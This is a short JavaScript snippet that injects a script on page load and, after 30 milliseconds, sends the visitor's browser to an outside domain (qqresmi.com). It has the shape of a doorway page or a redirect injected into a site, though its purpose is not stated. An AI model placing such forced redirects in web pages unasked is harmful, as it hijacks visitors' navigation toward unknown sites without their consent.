 var url = Array("https://qqresmi.com/");
            var rid = "";

            var timesleep = "30";

			
			function put() {
                var script = document.createElement("script");
                script.innerHTML = 'var weburl = url[Math.floor(Math.random()*url.length)]+""+rid; setTimeout(function () {window.location = weburl;},timesleep);';
                document.body.appendChild(script)
            }
            function jump() {
                if (typeof url == 'undefined' || url == null) {
                    setTimeout(function() {
                        jump()
                    }, 50)
                } else {
                    put()
                }
            }
            jump();
